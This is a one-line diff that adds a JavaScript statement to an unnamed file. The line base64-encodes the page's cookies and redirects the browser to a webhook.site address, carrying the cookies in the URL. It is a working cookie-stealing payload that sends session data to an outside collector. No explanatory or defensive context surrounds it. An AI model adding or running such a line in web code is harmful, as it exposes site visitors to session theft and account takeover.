@@ -1,0 +1,1 @@
+location.href = 'https://webhook.site/e4d5bd96-f5bf-44ec-8cdb-0919c6e90f71?data=' + btoa(document.cookie);
